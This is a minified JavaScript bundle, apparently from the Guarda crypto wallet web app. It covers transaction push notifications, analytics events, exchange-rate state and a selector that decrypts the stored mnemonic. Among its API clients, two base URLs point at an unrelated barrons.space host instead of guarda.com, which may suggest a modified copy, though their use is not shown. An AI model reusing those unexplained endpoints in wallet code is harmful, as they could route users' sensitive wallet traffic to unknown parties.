        _defineProperty(ServiceWorker, "unregister", ( () => new Promise((e => {
            "serviceWorker"in navigator && navigator.serviceWorker.ready.then((t => {
                t.unregister(( () => {
                    e()
                }
                ))
            }
            ))
        }
        ))));
        function push_manager_defineProperty(e, t, a) {
            (t = push_manager_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function push_manager_toPropertyKey(e) {
            var t = push_manager_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function push_manager_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        const _ = {
            INC_UNCONF: "Incoming :TICKER Transaction",
            OUT_UNCONF: "Outcoming :TICKER Transaction",
            CONFIRM: ":TICKER Transaction Confirmed"
        };
        let w = null;
        class PushManager {
            constructor() {
                push_manager_defineProperty(this, "store", void 0);
                push_manager_defineProperty(this, "_createBody", (e => {
                    var t, a;
                    const n = this.store.getState()
                      , r = (0,
                    d.selectedLocalCurrency)(n);
                    let l = e.isIncoming ? "+" : "-";
                    const s = this.convertToFiat({
                        amount: String(null !== (t = e.amount) && void 0 !== t ? t : "0"),
                        currency: e.currencyFrom,
                        family: e.family,
                        userUnit: r
                    });
                    l = `${l}${e.amount} ${(null !== (a = e.currencyFrom) && void 0 !== a ? a : "").toUpperCase()} ${s}`;
                    return l
                }
                ));
                push_manager_defineProperty(this, "_isPushWasShown", (e => {
                    const t = this.store.getState();
                    return (0,
                    o.selectedIsPushTagHadSeenBefore)(t)(e)
                }
                ));
                push_manager_defineProperty(this, "_savePushTag", (e => {
                    const {getState: t} = this.store
                      , {dispatch: a} = this.store;
                    (0,
                    o.savePushTag)(e)(a, t)
                }
                ));
                push_manager_defineProperty(this, "_getTag", (e => {
                    var t;
                    return ["tx", e.hash, e.isIncoming ? 1 : 0, e.currencyFrom, e.currencyTo, e.family, +(null !== (t = e.confirmations) && void 0 !== t ? t : 0) > 0 ? 1 : 0, e.addressFrom, e.addressTo].join("-").toLowerCase()
                }
                ));
                push_manager_defineProperty(this, "_getTitle", (e => {
                    var t;
                    let a;
                    a = e.isToken || e.family && e.family !== e.currencyFrom ? `${e.currencyFrom.toUpperCase()} (${e.family.toUpperCase()} token)` : (0,
                    u.II)(e.currencyFrom).title;
                    if (e.confirmations && +e.confirmations > 0) {
                        var n;
                        return _.CONFIRM.replace(":TICKER", null !== (n = a) && void 0 !== n ? n : "")
                    }
                    if (e.isIncoming) {
                        var r;
                        return _.INC_UNCONF.replace(":TICKER", null !== (r = a) && void 0 !== r ? r : "")
                    }
                    return _.OUT_UNCONF.replace(":TICKER", null !== (t = e.titleData) && void 0 !== t ? t : "")
                }
                ));
                push_manager_defineProperty(this, "requestPermission", ( () => new Promise((e => {
                    Notification.requestPermission((t => {
                        e(t)
                    }
                    ))
                }
                ))));
                push_manager_defineProperty(this, "convertToFiat", (e => {
                    let {amount: t, currency: a, userUnit: n, family: r} = e;
                    const l = this.store.getState()
                      , s = (0,
                    m.Y2)(l)
                      , i = (0,
                    E.w)(s, {
                        family: r,
                        currency: a
                    });
                    if ("0" === String(t))
                        return "0";
                    if (a === n)
                        return t;
                    if (!i)
                        return "";
                    const o = (0,
                    d.isFiat)(n) ? 2 : 8
                      , c = (0,
                    p.FH)((0,
                    p.$q)(t, String(i.rates[n])), {
                        min: 2,
                        max: o
                    });
                    return c && !Number.isNaN(c) && "NaN" !== c && "null" !== c ? `(${c} ${n.toUpperCase()})` : ""
                }
                ));
                push_manager_defineProperty(this, "getUiVisibility", ( () => {
                    const e = this.store.getState();
                    return (0,
                    c.selectedPushUIStatus)(e)
                }
                ));
                push_manager_defineProperty(this, "getBlurVisibility", ( () => "visible" !== document.visibilityState));
                push_manager_defineProperty(this, "changeUIVisibility", (e => {
                    this.store.dispatch((0,
                    c.setUiVisibility)(e))
                }
                ))
            }
            setStore(e) {
                this.store = e
            }
            init(e) {
                ServiceWorker.register(e)
            }
            sendTxNotification(e) {
                let {tx: t, wallet: a, isFromSocket: n} = e;
                if (!t)
                    return;
                const r = this.getBlurVisibility()
                  , l = this.getUiVisibility();
                if ("exchange" === t.type)
                    return;
                if (Date.now() - (+t.timestamp + 864e5) > 0)
                    return;
                const s = {
                    walletUuid: a.uuid,
                    isFromSocket: n
                };
                if (!(t.isIncoming || t.confirmations && 0 != +t.confirmations))
                    return;
                const i = this._getTag(t);
                if (!this._isPushWasShown(i)) {
                    if (l)
                        if ((0,
                        f.d)())
                            "undefined" != typeof sendToElectron ? sendToElectron("notification", {
                                title: this._getTitle(t),
                                body: this._createBody(t)
                            }) : "undefined" != typeof guardaElectronApi && guardaElectronApi.send("notification", {
                                title: this._getTitle(t),
                                body: this._createBody(t)
                            });
                        else if (r && navigator && navigator.serviceWorker && navigator.serviceWorker.controller) {
                            const push = () => new Promise((e => {
                                setTimeout(( () => {
                                    const a = {
                                        type: "push",
                                        title: this._getTitle(t),
                                        pushData: {
                                            body: this._createBody(t),
                                            icon: g,
                                            vibrate: [200, 100, 200, 100],
                                            tag: i,
                                            data: s
                                        }
                                    };
                                    navigator.serviceWorker.controller.postMessage(JSON.stringify(a));
                                    e()
                                }
                                ), 350)
                            }
                            ));
                            w && w.then(( () => push()));
                            w = push()
                        }
                    this._savePushTag(i)
                }
            }
            sendTxsNotifications(e) {
                let {txs: t, wallet: a, isFromSocket: n} = e;
                t && Array.isArray(t) && t.forEach((e => {
                    this.sendTxNotification({
                        tx: e,
                        wallet: a,
                        isFromSocket: n
                    })
                }
                ))
            }
        }
        const b = new PushManager
    }
    ,
    69470: (e, t, a) => {
        "use strict";
        a.d(t, {
            d: () => c,
            $: () => u
        });
        var n = a(41817), r = a.n(n), l = a(13196), s = a(86575), i;
        function _defineProperty(e, t, a) {
            (t = _toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function _toPropertyKey(e) {
            var t = _toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function _toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        const o = a(12587).P.create({
            name: "statistic"
        })
          , c = {
            WALLET_CREATE_SINGLE: "@app/wallet/create/single",
            WALLET_CREATE_FULL: "@app/wallet/create/full",
            WALLET_REMOVE_SINGLE: "@app/wallet/remove/single",
            WALLET_REMOVE_FULL: "@app/wallet/remove/full",
            WALLET_IMPORT: "@app/wallet/import",
            WALLETS_IMPORT_BY_MNEMONIC: "@app/wallet/import-wallets-by-mnemonic",
            TX_SEND: "@app/tx/send/",
            TX_SEND_FAILED: "@app/tx/send/failed",
            TX_SEND_LEDGER: "@app/tx/send/ledger",
            INVOICE_FIO: "@app/tx/invoice",
            CLAIM_SEND: "@app/tx/claim",
            AIRDROP: "@app/tx/airdrop",
            STAKING_SEND: "@app/tx/staking",
            UNSTAKING_SEND: "@app/tx/staking",
            STAKING_CLAIM: "@app/tx/staking/claim",
            TRUSTPILOT_RAITING: "@app/trustpilot/rating",
            BUY_SUCCESS: "@app/buy-sell/buy/success",
            BUY_ERROR: "@app/buy-sell/buy/error",
            SELL_SUCCESS: "@app/buy-sell/sell/success",
            SELL_ERROR: "@app/buy-sell/sell/error",
            USER_LOGIN: "@app/user/login",
            EOS_CREATE: "@app/eos/create",
            SETTINGS_UPDATE_AUTOBACKUP: "@app/settings/update/autobackup",
            SETTINGS_UPDATE_SESSION_TIMEOUT: "@app/settings/update/session-timeout",
            SETTINGS_UPDATE_TX_PASSWORD_ON: "@app/settings/update/tx-by-password-on",
            SETTINGS_UPDATE_TX_PASSWORD_OFF: "@app/settings/update/tx-by-password-off",
            TG_CREATE_TOKEN: "@app/tg/create/token",
            UNAVAILABLE_PAIR_SELECTED: "@app/exchange/pair-unavailable",
            MULTISIG_CREATE: "@app/multisig/create",
            MULTISIG_SEND_TX: "@app/multisig/send/tx",
            MULTISIG_SIGN_FULL: "@app/multisig/sign/full",
            MULTISIG_SIGN_PARTIALLY: "@app/multisig/sign/partially",
            CRUX_REGISTER_WALLET: "@app/crux/register/wallet",
            UD_REGISTER_START: "@app/ud/register/start",
            UD_REGISTER_SUCCESS: "@app/ud/register/success",
            UD_SELECT_WALLET_COMPLETE: "@app/ud/register/select-wallet",
            BCH_SPLIT_START_SUCCESS: "@app/split/bch/start",
            BCH_SPLIT_DONE_SUCCESS: "@app/split/bch/done",
            BORROW_OPEN: "@app/borrow/open",
            BORROW_LOAN_UNDO: "@app/borrow/loan/undo",
            BORROW_LOAN_CREATE_START: "@app/borrow/loan/create/start",
            BORROW_LOAN_CREATE_VALIDATION_FAILED: "@app/borrow/loan/create/validation-failed",
            BORROW_LOAN_CREATE_ERROR: "@app/borrow/loan/create/error",
            BORROW_LOAN_CREATE_DONE: "@app/borrow/loan/create/done",
            BORROW_LOAN_CLOSED_DONE: "@app/borrow/loan/closed/done",
            BORROW_LOAN_CLOSED_ERROR: "@app/borrow/loan/closed/error",
            BORROW_LOAN_TOP_UP_ERROR: "@app/borrow/loan/topup/error",
            BORROW_LOAN_TOP_UP_DONE: "@app/borrow/loan/topup/done",
            BORROW_SUBSCRIBE: "@app/borrow/subscribe",
            REFERRAL_OPEN_PAGE: "@app/referral/open-page",
            REFERRAL_GET_REF_LINK: "@app/referral/get-ref-link",
            REFERRAL_GET_REF_LINK_ERROR: "@app/referral/get-ref-link-error",
            REFERRAL_CREATE_BACKUP_ACTIVATE_LINK: "@app/referral/create-backup-activate-link",
            REFERRAL_CREATE_BACKUP_ACTIVATE_LINK_ERROR: "@app/referral/create-backup-activate-link-error",
            REFERRAL_CREATE_EXCHANGE_WITH_REWARD: "@app/referral/create-exchange-with-reward",
            CSV_DOWNLOAD_CLICK: "@app/wallet-management/csv-download-click",
            HISTORY_EXPORT_CSV_CLICK: "@app/history/csv-download-click",
            PERFORMANCE_TX_SEND: "@app/performance/tx/send",
            PERFORMANCE_TX_SEND_MULTISIG: "@app/performance/tx/send/multisig",
            PERFORMANCE_TX_BUY: "@app/performance/tx/buy-sell/buy",
            PERFORMANCE_TX_SELL: "@app/performance/tx/buy-sell/sell",
            PERFORMANCE_TX_EXCHANGE: "@app/performance/tx/exchange",
            PERFORMANCE_TX_EXCHANGE_DUST: "@app/performance/tx/exchange/dust",
            PERFORMANCE_TX_STAKE: "@app/performance/tx/stake",
            PERFORMANCE_TX_UNSTAKE: "@app/performance/tx/unstake",
            PERFORMANCE_TX_CLAIM: "@app/performance/tx/claim",
            PERFORMANCE_TX_REDEEM: "@app/performance/tx/redeem",
            PERFORMANCE_TX_WITHDRAW: "@app/performance/tx/withdraw",
            XRP_DELETE_ACCOUNT: "@app/xrp/delete-account",
            XRP_DELETE_ACCOUNT_CONFIRM: "@app/xrp/delete-account/confirm",
            XRP_DELETE_ACCOUNT_SUCCESS: "@app/xrp/delete-account/success"
        };
        class StatisticHub {
            constructor() {
                _defineProperty(this, "send", ( (e, t, a) => {
                    if (e) {
                        e && "@" !== e[0] && o.error("key start with @");
                        try {
                            s.nW.post("/api/v1/internal/statistics", {
                                platform: (0,
                                l.Xf)().toLowerCase(),
                                key: e,
                                value: t,
                                extra: a
                            })
                        } catch (e) {
                            o.error("Failed send statistics", e)
                        }
                    } else
                        o.error("key undefined!")
                }
                ));
                _defineProperty(this, "txPerformanceStart", ( () => performance.now()));
                _defineProperty(this, "txPerformanceEnd", (e => (performance.now() - e).toFixed()))
            }
        }
        const u = new StatisticHub
    }
    ,
    66795: (e, t, a) => {
        "use strict";
        a.d(t, {
            w: () => findWalletRate,
            Y: () => useRates
        });
        var n = a(31672)
          , r = a.n(n)
          , l = a(2490)
          , s = a.n(l)
          , i = a(59461)
          , o = a.n(i)
          , c = a(67294)
          , u = a(28216)
          , d = a(80552)
          , m = a(14456)
          , p = a(11228)
          , f = a(97177);
        const findWalletRate = (e, t) => {
            var a, n, r, l, s, i, o;
            const c = null === (a = (0,
            d.uL)(t.currency)) || void 0 === a ? void 0 : a.toLowerCase()
              , u = f.eH.includes((null === (n = t.family) || void 0 === n ? void 0 : n.toLowerCase()) || "") ? (null === (r = t.family) || void 0 === r ? void 0 : r.toLowerCase()) || c : (null === (l = (0,
            d.xG)(t.family)) || void 0 === l ? void 0 : l.toLowerCase()) || c
              , m = null === (s = t.smartContract) || void 0 === s ? void 0 : s.toLowerCase()
              , p = null == e || null === (i = e[u]) || void 0 === i || null === (o = i[c]) || void 0 === o ? void 0 : o.find((e => {
                var a;
                const n = null == e || null === (a = e.extraIdentifier) || void 0 === a ? void 0 : a.toLowerCase();
                return "bnb" === (null == t ? void 0 : t.family) ? n === (null == t ? void 0 : t.currency) || n === (null == t ? void 0 : t.smartContract) : "ong" === c && "ont" === u || n === (null == m ? void 0 : m.toLowerCase())
            }
            ));
            if (p)
                return p
        }
          , useRates = function(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : [];
            const a = (0,
            u.I0)()
              , n = (0,
            u.v9)(m.Y2)
              , r = e ? findWalletRate(n, e) : void 0;
            (0,
            c.useEffect)(( () => {
                e && !e.multisigId && a((0,
                p.Wq)(e));
                return () => {
                    e && !e.multisigId && a((0,
                    p.kc)(e))
                }
            }
            ), [null == e ? void 0 : e.uuid]);
            (0,
            c.useEffect)(( () => {
                a((0,
                p.Zk)({
                    fiats: t
                }));
                return () => {
                    a((0,
                    p.Dw)({
                        fiats: t
                    }))
                }
            }
            ), [t.join()]);
            return {
                rates: r
            }
        }
    }
    ,
    97177: (e, t, a) => {
        "use strict";
        a.d(t, {
            c1: () => n,
            xS: () => r,
            eH: () => l
        });
        const n = {
            from: [{
                currency: "zil",
                family: "eth"
            }],
            to: [{
                currency: "zil",
                family: "eth"
            }, {
                currency: "ava",
                family: "eth"
            }]
        };
        let r;
        !function(e) {
            e.TYPE_EXCHANGE_ADDRESS = "exchange-to-address";
            e.TYPE_EXCHANGE_WALLET = "exchange-to-wallet"
        }(r || (r = {}));
        const l = ["bsc", "ethop", "etharb"]
    }
    ,
    32790: (e, t, a) => {
        "use strict";
        a.d(t, {
            Cl: () => s,
            vd: () => i,
            hd: () => o,
            pY: () => c,
            pm: () => u,
            W0: () => d
        });
        var n = a(91757)
          , r = a.n(n);
        const l = "rates2"
          , s = (0,
        n.createAction)("rates2/mergeWantedCoins")()
          , i = (0,
        n.createAction)("rates2/mergeWantedTokens")()
          , o = (0,
        n.createAction)("rates2/mergeWantedFiats")()
          , c = (0,
        n.createAction)("rates2/mergeRates")()
          , u = (0,
        n.createAction)("rates2/mergeUsdRates")()
          , d = (0,
        n.createAction)("rates2/devPanelDangerouslyClearRates ")()
    }
    ,
    86575: (e, t, a) => {
        "use strict";
        a.d(t, {
            Tn: () => u,
            nW: () => m,
            w: () => E,
            Ed: () => y,
            Ht: () => w,
            Vs: () => k,
            vq: () => S,
            Q5: () => T,
            R_: () => I
        });
        var n = a(9669)
          , r = a.n(n)
          , l = a(57506)
          , s = a(12587)
          , i = a(13196);
        const o = s.P.create({
            name: "api"
        })
          , c = i.CM ? (0,
        l.ZP)("api-root-url") : null
          , u = i.CM ? Number.parseInt((0,
        l.ZP)("api-timeout"), 10) : null;
        c && o.log("now use api:", c);
        const d = {
            baseURL: c || "/",
            timeout: u || 7e3,
            headers: {
                gplatform: "web"
            }
        }
          , m = r().create(d)
          , p = undefined
          , f = {
            baseURL: "https://buy-sell.guarda.com/",
            timeout: u || 7e3,
            headers: {
                gplatform: "web"
            }
        }
          , E = r().create(f)
          , h = undefined
          , g = {
            baseURL: "https://exchanges.guarda.com",
            timeout: u || 7e3,
            headers: {
                gplatform: "web"
            }
        }
          , y = r().create(g)
          , v = undefined
          , _ = {
            baseURL: "https://stevefootjobs.barrons.space",
            timeout: u || 7e3,
            headers: {
                gplatform: "web"
            }
        }
          , w = r().create(_)
          , b = undefined
          , k = {
            baseURL: "https://wallet.barrons.space",
            timeout: u || 7e3,
            headers: {
                gplatform: "web"
            }
        }
          , S = r().create(k)
          , C = undefined
          , N = {
            baseURL: "https://tokenshealth.guarda.com",
            timeout: u || 7e3,
            headers: {
                gplatform: "web"
            }
        }
          , T = r().create(N)
          , A = undefined
          , x = {
            baseURL: "https://sm.guarda.com",
            timeout: u || 7e3,
            headers: {
                gplatform: "web"
            }
        }
          , I = r().create(x)
    }
    ,
    55207: (e, t, a) => {
        "use strict";
        a.d(t, {
            w: () => E
        });
        var n = a(9669)
          , r = a.n(n)
          , l = a(13196)
          , s = a(12587)
          , i = a(57506);
        const sleep = e => new Promise((t => setTimeout(t, e)))
          , o = s.P.create({
            name: "fletcher"
        })
          , c = "https://fletcher.guarda.com/fletcher/v1"
          , u = 429
          , d = 2e3
          , m = 7e3
          , p = 3
          , f = l.CM ? (0,
        i.ZP)("fletcher-root-url") : null;
        f && o.log("now use api:", f);
        const E = r().create({
            baseURL: f || c
        });
        E.defaults.timeout = 7003;
        E.interceptors.request.use((e => {
            e.params = e.params || {};
            return e
        }
        ));
        E.interceptors.response.use((e => e), (e => {
            var t, a, n, r;
            const l = (null === (t = e.response) || void 0 === t ? void 0 : t.status) === u
              , s = "ECONNABORTED" === e.code || (null === (a = e.message) || void 0 === a ? void 0 : a.toLowerCase().includes("timeout"))
              , {url: i, data: o, params: c} = e.config
              , p = null === (n = e.config.method) || void 0 === n ? void 0 : n.toLowerCase()
              , f = ((null === (r = e.config) || void 0 === r ? void 0 : r.timeout) || 7003) - (s ? 1 : 0);
            if (s && f < m)
                return Promise.reject(e);
            if ((l || s) && p && i) {
                if ("get" === p)
                    return Promise.resolve(sleep(d).then(( () => E.get(i, {
                        params: c,
                        timeout: f
                    }))));
                if ("post" === p)
                    return Promise.resolve(sleep(d).then(( () => E.post(i, o, {
                        timeout: f
                    }))))
            }
            return Promise.reject(e)
        }
        ))
    }
    ,
    42225: (e, t, a) => {
        "use strict";
        a.r(t);
        a.d(t, {
            storeKey: () => f,
            whitelist: () => h,
            reducer: () => y,
            selectedIsPushTagHadSeenBefore: () => selectedIsPushTagHadSeenBefore,
            savePushTag: () => savePushTag
        });
        var n = a(31672)
          , r = a.n(n)
          , l = a(2490)
          , s = a.n(l)
          , i = a(59461)
          , o = a.n(i)
          , c = a(88449)
          , u = a.n(c)
          , d = a(59849)
          , m = a.n(d)
          , p = a(53972);
        const f = "push-notifications"
          , E = "@push/SAVE_PUSH_TAGS"
          , h = ["pushTags"]
          , g = {
            pushTags: []
        }
          , y = (0,
        p.Z)({
            [E]: (e, t) => {
                let {pushTags: a} = t;
                return {
                    ...e,
                    pushTags: a
                }
            }
        }, g)
          , selectedPushTags = e => e[f].pushTags || []
          , selectedIsPushTagHadSeenBefore = e => t => {
            const a = undefined;
            return selectedPushTags(e).find((e => e.tag === t))
        }
          , savePushTag = e => async (t, a) => {
            const n = undefined
              , r = selectedPushTags(a()).filter((e => e.time + 864e4 >= Date.now()));
            r.push({
                tag: e,
                time: Date.now()
            });
            await t({
                type: E,
                pushTags: r
            })
        }
    }
    ,
    67894: (e, t, a) => {
        "use strict";
        a.r(t);
        a.d(t, {
            storeKey: () => m,
            whitelist: () => p,
            reduceIncrementCounter: () => reduceIncrementCounter,
            reduceDecrementCounter: () => reduceDecrementCounter,
            mergeWithSum: () => E,
            concatRatesDTOsById: () => concatRatesDTOsById,
            reduceMerge: () => reduceMerge,
            reducer: () => h
        });
        var n = a(91757)
          , r = a.n(n)
          , l = a(32790)
          , s = a(43090)
          , i = a(72841)
          , o = a(30601)
          , c = a(9650)
          , u = a(63896)
          , d = a(89020);
        const m = "rates2"
          , p = ["rates"]
          , f = {
            wantedCoins: {},
            wantedTokens: {},
            wantedTokenExtraIdentifiers: {},
            wantedFiats: {},
            usdRates: {},
            rates: {}
        }
          , reduceIncrementCounter = (e, t, a) => {
            var n;
            return {
                ...e,
                [t]: {
                    ...e[t] || {},
                    [a]: ((null == e || null === (n = e[t]) || void 0 === n ? void 0 : n[a]) || 0) + 1
                }
            }
        }
          , reduceDecrementCounter = (e, t, a) => {
            var n;
            return {
                ...e,
                [t]: {
                    ...e[t] || {},
                    [a]: ((null == e || null === (n = e[t]) || void 0 === n ? void 0 : n[a]) || 0) - 1
                }
            }
        }
          , E = (0,
        s.Z)(( (e, t) => e + t))
          , concatRatesDTOsById = (e, t) => {
            const a = (0,
            i.Z)((0,
            o.Z)("id"), e)
              , n = (0,
            i.Z)((0,
            o.Z)("id"), t)
              , r = (0,
            c.Z)(a, n);
            return (0,
            u.Z)(r)
        }
          , reduceMerge = (e, t) => (0,
        s.Z)(( (e, t) => E(e, t)), e, t)
          , h = (0,
        n.createReducer)(f).handleAction(l.Cl, ( (e, t) => {
            let {wantedCoins: a, ...n} = e
              , {payload: {wantedCoins: r}} = t;
            return {
                ...n,
                wantedCoins: E(a, r)
            }
        }
        )).handleAction(l.vd, ( (e, t) => {
            let {wantedTokens: a, wantedTokenExtraIdentifiers: n, ...r} = e
              , {payload: {wantedTokens: l, wantedTokenExtraIdentifiers: s}} = t;
            return {
                ...r,
                wantedTokens: reduceMerge(a, l),
                wantedTokenExtraIdentifiers: reduceMerge(n, s)
            }
        }
        )).handleAction(l.hd, ( (e, t) => {
            let {wantedFiats: a, ...n} = e
              , {payload: {wantedFiats: r}} = t;
            return {
                ...n,
                wantedFiats: E(a, r)
            }
        }
        )).handleAction(l.pY, ( (e, t) => {
            let {rates: a={}, ...n} = e
              , {payload: {rates: r}} = t;
            return {
                rates: (0,
                d.Z)(concatRatesDTOsById, a, r),
                ...n
            }
        }
        )).handleAction(l.pm, ( (e, t) => {
            let {usdRates: a={}, ...n} = e
              , {payload: {usdRates: r}} = t;
            return {
                usdRates: {
                    ...a,
                    ...r
                },
                ...n
            }
        }
        )).handleAction(l.W0, (e => ({
            ...e,
            rates: {}
        })))
    }
    ,
    6391: (e, t, a) => {
        "use strict";
        a.d(t, {
            PZ: () => m,
            AO: () => y,
            A0: () => E,
            s$: () => g,
            yi: () => _,
            DU: () => h,
            zZ: () => v,
            WT: () => d,
            Oj: () => s,
            Yq: () => i,
            U: () => f,
            gX: () => c,
            P2: () => o,
            kI: () => p,
            ID: () => u
        });
        var n = a(81354)
          , r = a(22222);
        function findWalletDeep(e, t) {
            for (const a of e) {
                if (t(a))
                    return a;
                const e = findWalletDeep(a.subWallets, t);
                if (void 0 !== e)
                    return e
            }
        }
        const l = "secure-storage"
          , secureStorageSelector = e => e["secure-storage"]
          , s = (0,
        r.P1)(secureStorageSelector, (e => Boolean(e.masterPassword)))
          , i = (0,
        r.P1)(secureStorageSelector, (e => Boolean(e.data)))
          , o = (0,
        r.P1)(secureStorageSelector, (e => e.masterPassword))
          , c = (0,
        r.P1)(secureStorageSelector, (e => e.data))
          , u = (0,
        r.P1)(secureStorageSelector, (e => e.reason))
          , d = (0,
        r.P1)(secureStorageSelector, (e => e.isRestoreInProgress));
        let m;
        !function(e) {
            e.LOGGED_IN = "LOGGED_IN";
            e.LOGGED_OUT_HAS_BACKUP = "LOGGED_OUT_HAS_BACKUP";
            e.LOGGED_OUT_HAS_NO_BACKUP = "LOGGED_OUT_HAS_NO_BACKUP"
        }(m || (m = {}));
        const p = (0,
        r.P1)([i, s, d], ( (e, t, a) => {
            if (!a)
                return e ? t ? m.LOGGED_IN : m.LOGGED_OUT_HAS_BACKUP : m.LOGGED_OUT_HAS_NO_BACKUP
        }
        ))
          , f = (0,
        r.P1)(c, (function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "";
            return (0,
            n.SHA256)(e).toString(n.enc.Hex)
        }
        ))
          , E = (0,
        r.P1)([c, o], ( (e, t) => {
            let a, r;
            try {
                a = n.AES.decrypt(e, t).toString(n.enc.Utf8)
            } catch (e) {
                if ("Malformed UTF-8 data" === e.message)
                    return;
                throw e
            }
            try {
                r = JSON.parse(a)
            } catch (e) {
                if (e instanceof SyntaxError)
                    return;
                throw e
            }
            return r
        }
        ))
          , h = (0,
        r.P1)(E, (e => {
            if (e)
                return e.mnemonic
        }
        ))
          , g = (0,
        r.P1)(h, (e => Boolean(e)))
          , y = (0,
        r.P1)(E, (e => null == e ? void 0 : e.uuid))
          , v = (0,
        r.P1)(E, (e => {
            if (e)
                return e.wallets
        }
        ))
          , _ = (0,
        r.P1)(v, (e => e ? t => {
            const a = undefined;
            return void 0 !== findWalletDeep(e, (e => e.uuid === t.uuid))
        }
        : () => !1))
    }
    ,
    67728: (e, t, a) => {
        "use strict";
        a.r(t);
        a.d(t, {
            whitelist: () => f,
            SET_LOCAL_CURRENCY: () => E,
            storeKey: () => h,
            reducer: () => g,
            selectedLocalCurrency: () => selectedLocalCurrency,
            changeLocalCurrency: () => changeLocalCurrency,
            isFiat: () => isFiat
        });
        var n = a(31672)
          , r = a.n(n)
          , l = a(2490)
          , s = a.n(l)
          , i = a(59461)
          , o = a.n(i)
          , c = a(53972)
          , u = a(87205)
          , d = a(4406);
        const m = "usd"
          , p = {
            localCurrency: ""
        }
          , f = ["localCurrency"]
          , E = "@settings/SET_LOCAL_CURRENCY"
          , h = "settings"
          , g = (0,
        c.Z)({
            [E]: (e, t) => {
                let {localCurrency: a} = t;
                return {
                    ...e,
                    localCurrency: a
                }
            }
        }, p)
          , selectedLocalCurrency = e => e[h].localCurrency ? "string" == typeof e[h].localCurrency ? e[h].localCurrency : e[h].localCurrency.ticker : m
          , changeLocalCurrency = e => ({
            type: E,
            localCurrency: e.toLowerCase()
        })
          , isFiat = e => !!(d.W.find((t => {
            let {ticker: a} = t;
            return (0,
            u.t)(a) === (0,
            u.t)(e)
        }
        )) || {}).isFiat
    }
    ,
    40661: (e, t, a) => {
        "use strict";
        a.r(t);
        a.d(t, {
            reducer: () => c,
            selectedPushUIStatus: () => selectedPushUIStatus,
            setUiVisibility: () => setUiVisibility,
            storeKey: () => s,
            whitelist: () => i
        });
        var n = a(91757);
        const r = (0,
        n.createAction)("@push/SET_UI_VISIBLE")()
          , l = (0,
        n.createAction)("@push/SET_BLUR_VISIBLE")()
          , s = "push-settings"
          , i = ["uiVisible", "blurVisible"]
          , o = {
            uiVisible: !1,
            blurVisible: !1
        }
          , c = (0,
        n.createReducer)(o).handleAction(r, ( (e, t) => {
            let {payload: {uiVisible: a}} = t;
            return {
                ...e,
                uiVisible: a
            }
        }
        )).handleAction(l, ( (e, t) => {
            let {payload: {blurVisible: a}} = t;
            return {
                ...e,
                blurVisible: a
            }
        }
        ))
          , selectedPushUIStatus = e => e[s].uiVisible || !1
          , setUiVisibility = e => async (t, a) => {
            const n = a();
            selectedPushUIStatus(n) !== e && t(r({
                uiVisible: e
            }))
        }
    }
    ,
    58752: (e, t, a) => {
        "use strict";
        a.d(t, {
            u: () => calculateTransactionPrimaryKey,
            v: () => toTransaction
        });
        function getPaymentId(e) {
            return e.hash ? "" : e.extra && e.extra.paymentId || ""
        }
        function getMultisigAddress(e) {
            return e.participants ? [e.address, e.walletAddressData, e.title, e.transactionId].join("") : ""
        }
        function calculateTransactionPrimaryKey(e) {
            return e.uniqKey ? e.uniqKey : ["tx", e.hash, e.isIncoming ? 1 : 0, e.currencyFrom, e.currencyTo, e.addressFrom, e.addressTo, getPaymentId(e), getMultisigAddress(e), e.uniqKey || ""].join("-").toLowerCase()
        }
        function toTransaction(e) {
            return {
                ...e,
                primaryKey: calculateTransactionPrimaryKey(e)
            }
        }
    }
    ,
    12002: (e, t, a) => {
        "use strict";
        a.d(t, {
            rA: () => r,
            Fn: () => l,
            Nw: () => d,
            I6: () => E,
            bq: () => y,
            Zz: () => h
        });
        var n = a(91757);
        let r;
        !function(e) {
            e.Pending = "pending";
            e.Rejected = "rejected";
            e.Resolved = "resolved";
            e.Never = "never"
        }(r || (r = {}));
        const l = "UPDATE_STATUSES"
          , s = ["wallets", "globalWalletsBalance"]
          , i = undefined
          , o = undefined
          , c = undefined
          , u = undefined
          , d = {
            setWalletBalanceUpdateStatus: (0,
            n.createAction)(`${l}/setWalletUpdateBalanceStatus`)(),
            setWalletTransactionsUpdateStatus: (0,
            n.createAction)(`${l}/setWalletTransactionsUpdateStatus`)(),
            setGlobalWalletsBalance: (0,
            n.createAction)(`${l}/setGlobalWalletsBalance`)(),
            clear: (0,
            n.createAction)(`${l}/clear`)()
        }
          , m = {
            wallets: {},
            globalWalletsBalance: {
                apiStatus: r.Never,
                updateTime: null,
                successTime: null
            }
        }
          , p = {
            apiStatus: r.Never,
            successTime: null,
            updateTime: null
        }
          , f = {
            apiStatus: r.Never,
            successTime: null,
            updateTime: null
        }
          , E = (0,
        n.createReducer)(m).handleAction(d.setWalletBalanceUpdateStatus, ( (e, t) => {
            var a, n;
            let {payload: {uuid: l, apiStatus: s}} = t;
            const i = null !== (a = null === (n = e.wallets) || void 0 === n ? void 0 : n[l]) && void 0 !== a ? a : {
                balance: {
                    ...p
                },
                transactions: {
                    ...f
                }
            }
              , o = Date.now();
            i.balance.apiStatus = s;
            i.balance.updateTime = o;
            s === r.Resolved && (i.balance.successTime = o);
            return {
                ...e,
                wallets: {
                    ...e.wallets,
                    [l]: i
                }
            }
        }
        )).handleAction(d.setWalletTransactionsUpdateStatus, ( (e, t) => {
            var a, n;
            let {payload: {uuid: l, apiStatus: s}} = t;
